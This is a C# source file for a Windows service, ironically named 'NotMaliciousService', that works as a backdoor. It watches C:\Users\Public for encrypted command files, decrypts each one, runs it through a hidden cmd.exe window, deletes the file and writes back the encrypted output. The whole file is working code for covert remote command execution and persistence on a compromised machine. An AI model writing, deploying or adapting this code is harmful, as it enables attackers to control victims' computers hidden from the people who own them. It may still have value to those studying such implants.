using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace NotMaliciousService {
	public partial class Service: ServiceBase {

		public static string defaultFolder = @"C:\Users\Public";

		public Service() {
			InitializeComponent();
		}


		public static string execCommand(string command) {

			string responseBlock = null;
			try {
				System.Diagnostics.Process process = new System.Diagnostics.Process();
				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = "/c" + command;
				startInfo.RedirectStandardOutput = true;
				startInfo.UseShellExecute = false;
				process.StartInfo = startInfo;
				process.Start();
				process.WaitForExit();

				responseBlock = String.Format("\nexitcode:{0} \noutput: {1} \nerror: {2}\n", process.ExitCode, process.StandardOutput.ReadToEnd(), "x") ;
			}
			catch (Exception ex) {
				responseBlock = ("Error:" + ex.Message);
			}
			return responseBlock;


		}

		public static bool waitForCommand(string guid) {

			try {
				if (File.Exists(String.Format(@"{0}\SSI-{1}.txt", defaultFolder, guid))) {
					return false;
				}
			}
			catch (Exception ex) {
				return true;
			}

			return true;

		}

		public static string readAndExecuteCommand(Encryption encryption) {

			string result = null;

			try {
				string filename = String.Format(@"{0}\SSI-{1}.txt", encryption.defaultFolder, encryption.comm_guid);
				var command = encryption.decrypt(File.ReadAllText(filename));
				Console.WriteLine("Received: {0}", command);
				result = execCommand(command);
				File.Delete(filename);
			} catch (Exception ex) {
				Console.WriteLine(ex);
			}

			return result;

		}

		protected override void OnStart(string[] args) {
			// first things first - Create key, so we can let the console knows that we are up!
			Encryption encryption = new Encryption(defaultFolder);

			if (encryption.setEncryptionKeys()) {
				// We can now receive commands from encrypted files

				while(true) {

					while (waitForCommand(encryption.comm_guid)) {
						// wait for command
					}

					Console.WriteLine("Received command!");
					var reply = readAndExecuteCommand(encryption);
					encryption.encrypt(reply);
				}
				

			}

		}

		public void RunAsConsole(string[] args) {

			OnStart(args);
			Console.WriteLine("Press any key to exit...");
			OnStop();
		}

		protected override void OnStop() {
		}
	}
}
